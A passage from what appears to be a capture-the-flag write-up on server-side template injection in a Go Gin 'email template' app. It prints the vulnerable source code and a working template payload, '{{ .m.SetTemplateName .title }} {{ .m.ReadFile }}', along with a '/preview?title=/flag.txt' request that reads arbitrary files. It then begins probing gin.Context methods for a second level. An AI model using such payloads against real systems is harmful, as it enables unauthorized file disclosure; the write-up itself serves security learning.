</span></span><span class=line><span class=cl> <span class=mi>186</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>187</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>188</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>189</span>
</span></span><span class=line><span class=cl> <span class=mi>190</span>          <span class=nx>tmpl</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>template</span><span class=p>.</span><span class=nf>New</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>).</span><span class=nf>Parse</span><span class=p>(</span><span class=nb>string</span><span class=p>(</span><span class=nx>content</span><span class=p>))</span>
</span></span><span class=line><span class=cl> <span class=mi>191</span>
</span></span><span class=line><span class=cl> <span class=mi>192</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>193</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>194</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>195</span>
</span></span><span class=line><span class=cl> <span class=mi>196</span>          <span class=nx>c</span><span class=p>.</span><span class=nf>Status</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>197</span>          <span class=nx>err</span> <span class=p>=</span> <span class=nx>tmpl</span><span class=p>.</span><span class=nf>Execute</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>198</span>
</span></span><span class=line><span class=cl> <span class=mi>199</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>200</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>201</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>202</span>      <span class=p>})</span>
</span></span><span class=line><span class=cl> <span class=mi>203</span>
</span></span><span class=line><span class=cl> <span class=mi>204</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>Run</span><span class=p>(</span><span class=s>&#34;127.0.0.1:8000&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>205</span>  <span class=p>}</span>
</span></span></code></pre></div></details><h2 id=get->GET /</h2><p>This is the landing page, no user input appears to be considered here. It does use a custom struct[ure] called <code>MyApp</code> to fetch the contents of a given template.</p><p>The struct is composed of only one variable, which is the <code>templateName</code> of type <code>string</code>. In Go, there is the concept of exported variables and functions. Being exported, means programmers can refer to the respective item directly when outside the package it was declared in. To be considered as exported, variables&rsquo; and functions&rsquo; names have to be declared with a capital letter at the beginning.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl><span class=nx>MyApp</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>()</span>   <span class=c1>// OK, wherever.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>MyApp</span><span class=p>.</span><span class=nx>templateName</span> <span class=c1>// Illegal outside &#34;main&#34; package.
</span></span></span></code></pre></div><p>The code also declares two functions that can be called on a <code>MyApp</code> instance.</p><p><code>SetTemplateName</code> is pretty much a setter function, to update the instance&rsquo;s <code>templateName</code> value.</p><p><code>ReadFile</code> is more interesting and has suspicious functionality. It first tries to open a file using the path in the instance&rsquo;s <code>templateName</code>. If the file does not exist, it will list all the files and directories present in the directory where <code>templateName</code> would be.</p><p>This route then renders the <code>templates/index.html</code> with some data (which includes the contents of file <code>templates/preview.html</code> )</p><h2 id=post-update>POST /update</h2><p>Using the struct <code>Update</code>, the route retrieves the <code>template</code> value of the JSON object in the request&rsquo;s body. Then it updates the contents of the file <code>templates/preview.html</code> with that value. This means that the file and its content should now be considered a user input. No sanitization appears to be present for it.</p><h2 id=any-preview>ANY /preview</h2><p>The <code>Any</code> route used here matches all HTTP methods. The route gets a few query parameters from the request which will be used to fill a <code>response</code> map variable. The <code>response</code> variable will also contain <code>custom</code> variables which we will revisit later, and a <code>m</code> variable which is the <code>MyApp</code> instance used to read the templates.</p><p>The <code>templates/preview.html</code> file gets read through the <code>MyApp</code> instance and the content is parsed as template. The template is then <code>Execute</code>d with the variable <code>response</code> as its data. The http response will contain the result of executing the template with the data.</p><h2 id=the-vulnerability>The Vulnerability</h2><p>I had never really heard of SSTI research or payloads in Go before. As such, I did a quick search to find existing research and found <a href=https://www.onsecurity.io/blog/go-ssti-method-research/>one article</a> by Gus Ralph. My main takeaway was that it is possible to call exported functions from the variables that were passed to the template.</p><p>Thankfully in this challenge, the template is provided the <code>m</code> variable of type <code>MyApp</code> which as we saw contains two exported functions.</p><p>We will use as reference the <a href=https://pkg.go.dev/text/template>documentation</a> for <code>text/template</code>. The following excerpt looks interesting:</p><pre tabindex=0><code>.Method [Argument...]
	The method can be alone or the last element of a chain but,
	unlike methods in the middle of a chain, it can take arguments.
	The result is the value of calling the method with the
	arguments:
		dot.Method(Argument1, etc.)
</code></pre><p>This means if we put in our template the following content:</p><pre tabindex=0><code>{{ .m.SetTemplateName &#34;fishinspace&#34; }}
</code></pre><p>After evaluating this template, the <code>m</code> instance will have its <code>templateName</code> changed. Combining this with <code>ReadFile</code>, we now have a gadget to read any file with sufficient permissions. <code>ReadFile</code> returns the file&rsquo;s content, so it will get inserted in the render, allowing us to view it. Let&rsquo;s also use a variable instead of hardcoding the name, so we do not have to reupload a template everytime.</p><pre tabindex=0><code>{{ .m.SetTemplateName .title }}
{{ .m.ReadFile }}
</code></pre><p>We upload this template and then preview it while making sure to use the GET query parameter <code>title</code> as our filename. We then get the flag.
Keep in mind, if the file does not exist, the directory will be listed. This will help us enumerate a few other files later on.</p><pre tabindex=0><code>GET /preview?title=/flag.txt
</code></pre><p><strong>FLAG-6f040fad14bea1df66d07d8ccc109924</strong></p><h1 id=level-2---pass-go-and-collect-id>Level 2 - Pass Go and Collect $(id)</h1><p>We now get access to a second website (<a href=http://dev-7fe5c15819a3af65.email-template.ctf>http://dev-7fe5c15819a3af65.email-template.ctf</a>). It is similar to the first one, code is provided again.</p><details><summary>main.go - Level 2</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl>   <span class=mi>1</span>  <span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span>
</span></span><span class=line><span class=cl>   <span class=mi>3</span>  <span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>   <span class=mi>4</span>      <span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>5</span>      <span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>6</span>
</span></span><span class=line><span class=cl>   <span class=mi>7</span>      <span class=s>&#34;net/http&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>8</span>      <span class=s>&#34;io/ioutil&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>9</span>
</span></span><span class=line><span class=cl>  <span class=mi>10</span>      <span class=s>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>11</span>  <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>12</span>
</span></span><span class=line><span class=cl>  <span class=mi>13</span>  <span class=kd>type</span> <span class=nx>Update</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>14</span>      <span class=nx>Template</span> <span class=kt>string</span> <span class=s>`json:&#34;template&#34; binding:&#34;required&#34;`</span>
</span></span><span class=line><span class=cl>  <span class=mi>15</span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>16</span>
</span></span><span class=line><span class=cl>  <span class=mi>17</span>  <span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>18</span>      <span class=nx>r</span> <span class=o>:=</span> <span class=nx>gin</span><span class=p>.</span><span class=nf>Default</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=mi>19</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>LoadHTMLGlob</span><span class=p>(</span><span class=s>&#34;templates/*&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>20</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>Static</span><span class=p>(</span><span class=s>&#34;/assets&#34;</span><span class=p>,</span> <span class=s>&#34;./assets&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>21</span>
</span></span><span class=line><span class=cl>  <span class=mi>22</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>GET</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>23</span>          <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Open</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>24</span>
</span></span><span class=line><span class=cl>  <span class=mi>25</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>26</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>27</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>28</span>
</span></span><span class=line><span class=cl>  <span class=mi>29</span>          <span class=k>defer</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>30</span>              <span class=k>if</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>();</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>31</span>                  <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>32</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>33</span>          <span class=p>}()</span>
</span></span><span class=line><span class=cl>  <span class=mi>34</span>
</span></span><span class=line><span class=cl>  <span class=mi>35</span>          <span class=nx>content</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>ReadAll</span><span class=p>(</span><span class=nx>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>36</span>
</span></span><span class=line><span class=cl>  <span class=mi>37</span>          <span class=nx>c</span><span class=p>.</span><span class=nf>HTML</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span> <span class=s>&#34;index.html&#34;</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;title&#34;</span><span class=p>:</span><span class=s>&#34;Test!&#34;</span><span class=p>,</span><span class=s>&#34;template&#34;</span><span class=p>:</span><span class=nb>string</span><span class=p>(</span><span class=nx>content</span><span class=p>),</span><span class=s>&#34;c&#34;</span><span class=p>:</span><span class=nx>c</span><span class=p>})</span>
</span></span><span class=line><span class=cl>  <span class=mi>38</span>      <span class=p>})</span>
</span></span><span class=line><span class=cl>  <span class=mi>39</span>
</span></span><span class=line><span class=cl>  <span class=mi>40</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>POST</span><span class=p>(</span><span class=s>&#34;/update&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>41</span>          <span class=kd>var</span> <span class=nx>update</span> <span class=nx>Update</span>
</span></span><span class=line><span class=cl>  <span class=mi>42</span>          <span class=kd>var</span> <span class=nx>err</span> <span class=kt>error</span>
</span></span><span class=line><span class=cl>  <span class=mi>43</span>
</span></span><span class=line><span class=cl>  <span class=mi>44</span>          <span class=nx>err</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>BindJSON</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>update</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>45</span>
</span></span><span class=line><span class=cl>  <span class=mi>46</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>47</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>48</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>49</span>
</span></span><span class=line><span class=cl>  <span class=mi>50</span>          <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>OpenFile</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>,</span> <span class=nx>os</span><span class=p>.</span><span class=nx>O_WRONLY</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_CREATE</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_TRUNC</span><span class=p>,</span> <span class=mo>0664</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>51</span>
</span></span><span class=line><span class=cl>  <span class=mi>52</span>          <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>53</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>54</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>55</span>
</span></span><span class=line><span class=cl>  <span class=mi>56</span>          <span class=k>defer</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=mi>57</span>
</span></span><span class=line><span class=cl>  <span class=mi>58</span>          <span class=k>if</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>WriteString</span><span class=p>(</span><span class=nx>update</span><span class=p>.</span><span class=nx>Template</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>59</span>              <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>60</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>61</span>
</span></span><span class=line><span class=cl>  <span class=mi>62</span>          <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=s>&#34;ok&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>63</span>      <span class=p>})</span>
</span></span><span class=line><span class=cl>  <span class=mi>64</span>
</span></span><span class=line><span class=cl>  <span class=mi>65</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>Any</span><span class=p>(</span><span class=s>&#34;/preview&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>66</span>          <span class=kd>var</span> <span class=nx>title</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>  <span class=mi>67</span>          <span class=k>if</span> <span class=nx>title</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>68</span>              <span class=nx>title</span> <span class=p>=</span> <span class=s>&#34;Test Email&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>69</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>70</span>
</span></span><span class=line><span class=cl>  <span class=mi>71</span>          <span class=kd>var</span> <span class=nx>eventname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>  <span class=mi>72</span>          <span class=k>if</span> <span class=nx>eventname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>73</span>              <span class=nx>eventname</span> <span class=p>=</span> <span class=s>&#34;My-Event-Name&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>74</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>75</span>
</span></span><span class=line><span class=cl>  <span class=mi>76</span>          <span class=kd>var</span> <span class=nx>firstname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>  <span class=mi>77</span>          <span class=k>if</span> <span class=nx>firstname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>78</span>              <span class=nx>firstname</span> <span class=p>=</span> <span class=s>&#34;John&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>79</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>80</span>
</span></span><span class=line><span class=cl>  <span class=mi>81</span>          <span class=kd>var</span> <span class=nx>lastname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>  <span class=mi>82</span>          <span class=k>if</span> <span class=nx>lastname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>83</span>              <span class=nx>lastname</span> <span class=p>=</span> <span class=s>&#34;Smith&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>84</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>85</span>
</span></span><span class=line><span class=cl>  <span class=mi>86</span>          <span class=kd>var</span> <span class=nx>companyname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>  <span class=mi>87</span>          <span class=k>if</span> <span class=nx>companyname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>88</span>              <span class=nx>companyname</span> <span class=p>=</span> <span class=s>&#34;Email Templating Inc.&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>89</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>90</span>
</span></span><span class=line><span class=cl>  <span class=mi>91</span>          <span class=c1>// Fetch all custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=mi>92</span>          <span class=kd>var</span> <span class=nx>num</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>  <span class=mi>93</span>          <span class=kd>var</span> <span class=nx>stop</span> <span class=kt>bool</span> <span class=p>=</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl>  <span class=mi>94</span>          <span class=kd>var</span> <span class=nx>custom</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>  <span class=mi>95</span>          <span class=kd>var</span> <span class=nx>customs</span> <span class=p>=</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kt>string</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>  <span class=mi>96</span>          <span class=k>for</span> <span class=nx>i</span> <span class=o>:=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>!</span><span class=nx>stop</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>97</span>              <span class=nx>num</span> <span class=p>=</span> <span class=s>&#34;custom&#34;</span><span class=o>+</span><span class=nb>string</span><span class=p>(</span><span class=nx>i</span><span class=o>+</span><span class=mi>48</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>98</span>              <span class=nx>custom</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=nx>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>99</span>
</span></span><span class=line><span class=cl> <span class=mi>100</span>              <span class=k>if</span> <span class=nx>custom</span> <span class=o>==</span> <span class=s>&#34;&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>101</span>                  <span class=nx>stop</span> <span class=p>=</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl> <span class=mi>102</span>                  <span class=k>break</span>
</span></span><span class=line><span class=cl> <span class=mi>103</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>104</span>              <span class=nx>customs</span><span class=p>[</span><span class=nx>num</span><span class=p>]</span> <span class=p>=</span> <span class=nx>custom</span>
</span></span><span class=line><span class=cl> <span class=mi>105</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>106</span>
</span></span><span class=line><span class=cl> <span class=mi>107</span>          <span class=c1>// Create the response map
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=mi>108</span>          <span class=kd>var</span> <span class=nx>response</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kd>interface</span><span class=p>{}</span> <span class=p>=</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>109</span>                  <span class=s>&#34;title&#34;</span><span class=p>:</span><span class=nx>title</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>110</span>                  <span class=s>&#34;eventname&#34;</span><span class=p>:</span><span class=nx>eventname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>111</span>                  <span class=s>&#34;firstname&#34;</span><span class=p>:</span><span class=nx>firstname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>112</span>                  <span class=s>&#34;lastname&#34;</span><span class=p>:</span><span class=nx>lastname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>113</span>                  <span class=s>&#34;companyname&#34;</span><span class=p>:</span><span class=nx>companyname</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>114</span>                  <span class=s>&#34;c&#34;</span><span class=p>:</span><span class=nx>c</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>115</span>              <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>116</span>
</span></span><span class=line><span class=cl> <span class=mi>117</span>          <span class=c1>// Merge the custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=mi>118</span>          <span class=k>for</span> <span class=nx>key</span><span class=p>,</span> <span class=nx>value</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>customs</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=mi>119</span>              <span class=nx>response</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span> <span class=p>=</span> <span class=nx>value</span>
</span></span><span class=line><span class=cl> <span class=mi>120</span>          <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=mi>121</span>
</span></span><span class=line><span class=cl> <span class=mi>122</span>          <span class=nx>c</span><span class=p>.</span><span class=nf>HTML</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>123</span>              <span class=s>&#34;preview.html&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>124</span>              <span class=nx>response</span><span class=p>,</span>
</span></span><span class=line><span class=cl> <span class=mi>125</span>          <span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>126</span>      <span class=p>})</span>
</span></span><span class=line><span class=cl> <span class=mi>127</span>
</span></span><span class=line><span class=cl> <span class=mi>128</span>      <span class=nx>r</span><span class=p>.</span><span class=nf>Run</span><span class=p>(</span><span class=s>&#34;127.0.0.1:8000&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=mi>129</span>  <span class=p>}</span>
</span></span></code></pre></div></details><p>This time, the <code>MyApp</code> custom struct is gone. Instead of the <code>m</code> variable, we notice the <code>c</code> variable of type <code>*gin.Context</code> being passed to the template. This seems like our best bet, so let&rsquo;s check the type and its exported fields. The relevant <a href=https://pkg.go.dev/github.com/gin-gonic/gin#Context>documentation</a> will be used along its <a href=https://github.com/gin-gonic/gin/blob/master/context.go>source code</a>.</p><p>Looking at the documentation for type <code>Context</code>, the following fields are exported (not including functions):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl><span class=kd>type</span> <span class=nx>Context</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>Request</span> <span class=o>*</span><span class=nx>http</span><span class=p>.</span><span class=nx>Request</span>
</span></span><span class=line><span class=cl>	<span class=nx>Writer</span>  <span class=nx>ResponseWriter</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>Params</span> <span class=nx>Params</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Keys is a key/value pair exclusively for the context of each request.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>Keys</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=nx>any</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Errors is a list of errors attached to all the handlers/middlewares who used this context.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>Errors</span> <span class=nx>errorMsgs</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Accepted defines a list of manually accepted formats for content negotiation.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>Accepted</span> <span class=p>[]</span><span class=kt>string</span>
</span></span><span class=line><span class=cl>	<span class=c1>// contains filtered or unexported fields
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>Since we have access to <code>Context.Request</code>, one could also look into the exported fields of the type <code>http.Request</code>. Most of my time was spent on trying to find suitable functions.</p><p>We are looking for any path that would allows us to read a file. A function of <code>Context</code> grabbed my attention, namely the <code>FileAttachment</code> function:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl><span class=c1>// FileAttachment writes the specified file into the body stream in an efficient way
</span></span></span><span class=line><span class=cl><span class=c1>// On the client side, the file will typically be downloaded with the given filename
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>Context</span><span class=p>)</span> <span class=nf>FileAttachment</span><span class=p>(</span><span class=nx>filepath</span><span class=p>,</span> <span class=nx>filename</span> <span class=kt>string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nf>isASCII</span><span class=p>(</span><span class=nx>filename</span><span class=p>)</span> <span class=p>{</span>
